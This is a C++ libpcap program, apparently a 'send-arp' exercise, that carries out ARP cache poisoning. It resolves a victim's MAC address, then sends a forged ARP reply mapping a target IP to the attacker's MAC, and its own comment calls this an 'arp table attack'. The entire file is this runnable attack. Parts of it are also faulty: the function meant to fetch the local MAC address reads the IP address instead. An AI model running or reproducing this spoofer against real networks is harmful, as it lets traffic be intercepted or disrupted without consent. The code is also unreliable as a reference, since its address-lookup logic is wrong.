#include<pcap.h>
#include<stdio.h>
#include<stdint.h>
#include<arpa/inet.h>
#include<string.h>
#include<cstdlib>
#include<sys/types.h>
#include<sys/socket.h>
#include <netinet/ip.h> 
#include <netinet/ether.h>
#include <sys/types.h>        
#include <sys/socket.h>       
#include <linux/if_ether.h>   
#include <net/ethernet.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>

struct arp_struct{
	u_char h_type[2];
	u_char p_type[2];
	u_char hp_len[2];
	u_char op[2];
	u_char src_mac[6];
	u_char src_ip[4];
	u_char dest_mac[6];
	u_char dest_ip[4];
	
};

struct eth_struct{
	u_char dest_adr[6];
	u_char src_adr[6];
	u_char eth_type[2];
	arp_struct arp;
};

void arp_send(u_char* src_ip,u_char* src_mac,u_char* dest_ip,u_char* dest_mac,pcap_t* handle){
	
	struct eth_struct eth;
	memcpy(eth.dest_adr, dest_mac,6);
	memcpy(eth.src_adr, src_mac,6);
	eth.eth_type[0]=0x08;
	eth.eth_type[1]=0x06;
	u_char defined[8]={0x00,0x01,0x08,0x00,0x06,0x04,0x00,0x02};
	memcpy(&eth.arp,defined,8);
	memcpy(eth.arp.src_mac,src_mac,6);
	memcpy(eth.arp.src_ip,src_ip,4);
	memcpy(eth.arp.dest_mac,dest_mac,6);
	memcpy(eth.arp.dest_ip, dest_ip, 4);
	
	uint8_t* packet=(uint8_t*)malloc(sizeof(struct eth_struct));
	memcpy(packet, &eth, sizeof(struct eth_struct));
	pcap_sendpacket(handle,packet,sizeof(struct eth_struct));
}


void arp_reply(u_char* src_ip,u_char* src_mac,u_char* dest_ip,u_char* dest_mac,pcap_t* handle){
	
	while(true){
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) 
			continue;
		if (res == -1 || res == -2) 
			break;
		
		if(ntohs(*((uint16_t*)(packet + 12)))==0x0806){
			memcpy(dest_mac, packet + 22, 6);
			break;
		}
	}
}	


void arp_request(u_char* my_ip,u_char* my_mac,u_char* sender_ip, pcap_t* handle){
	struct eth_struct eth;
	memset(eth.dest_adr, 0xff,6);
	memcpy(eth.src_adr,my_mac,6);
	eth.eth_type[0]=0x08;
	eth.eth_type[1]=0x06;
	u_char defined[8]={0x00,0x01,0x08,0x00,0x06,0x04,0x00,0x01};
	memcpy(&eth.arp,defined,8);
	memcpy(eth.arp.src_mac,my_mac,6);
	memcpy(eth.arp.src_ip,my_ip,4);
	memset(eth.arp.dest_mac,0x00,6);
	memcpy(eth.arp.dest_ip, sender_ip, 4);
	
	u_char* packet=(u_char*)malloc(sizeof(eth_struct));
	memcpy(packet, &eth, sizeof(struct eth_struct));
	pcap_sendpacket(handle,packet,sizeof(struct eth_struct));
}

void get_my_mac(uint8_t * my_mac, char * interface) {
	struct ifreq ifr;
	char ipstr[40];
	int s;

	s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, interface, IFNAMSIZ);

	if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
		printf("Error");
	}
	else {
		//		inet_ntop(AF_INET, ifr.ifr_addr.sa_data + 2, ipstr, sizeof(struct sockaddr));
		memcpy(my_mac, ifr.ifr_addr.sa_data, 6);
	}
}

void get_my_ip(uint8_t * my_ip, char * interface) {
	struct ifreq ifr;
	char ipstr[40];
	int s;

	s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, interface, IFNAMSIZ);

	if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
		printf("Error");
	}
	else {
		//inet_ntop(AF_INET, ifr.ifr_addr.sa_data + 2, ipstr, sizeof(struct sockaddr));
		memcpy(my_ip, ifr.ifr_addr.sa_data + 2, 4);
	}
}

int main(int argc, char* argv[])
{
	if (argc!=4){
		printf("usage : ./send-arp <interface> <sender ip> <target ip>");
		return -1;
	}
	
	u_char my_ip[4];
	u_char my_mac[6];
	u_char trg_ip[4];
	u_char trg_mac[6];
	u_char sender_ip[4];
	u_char sender_mac[6];

	get_my_ip(my_ip, argv[1]); // made by google
	get_my_mac(my_mac, argv[1]); // made by google
	
	uint32_t tmp = inet_addr(argv[2]);
	memcpy(sender_ip, &tmp, 4);
	tmp=inet_addr(argv[3]);
	memcpy(trg_ip,&tmp,4);
	
	char *dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	printf("start!\n");
	arp_request(my_ip,my_mac,sender_ip,handle); //sender_mac request
	arp_reply(my_ip,my_mac,sender_ip,sender_mac,handle); //get sender_mac
	printf("sender_mac replied!\n");
	printf("%x : %x : %x: %x: %x: %x\n",sender_mac[0],sender_mac[1],sender_mac[2],sender_mac[3],sender_mac[4],sender_mac[5]);
	arp_send(trg_ip,my_mac,sender_ip,sender_mac,handle); //arp table attack
	
	pcap_close(handle);
	return 0;
	
}
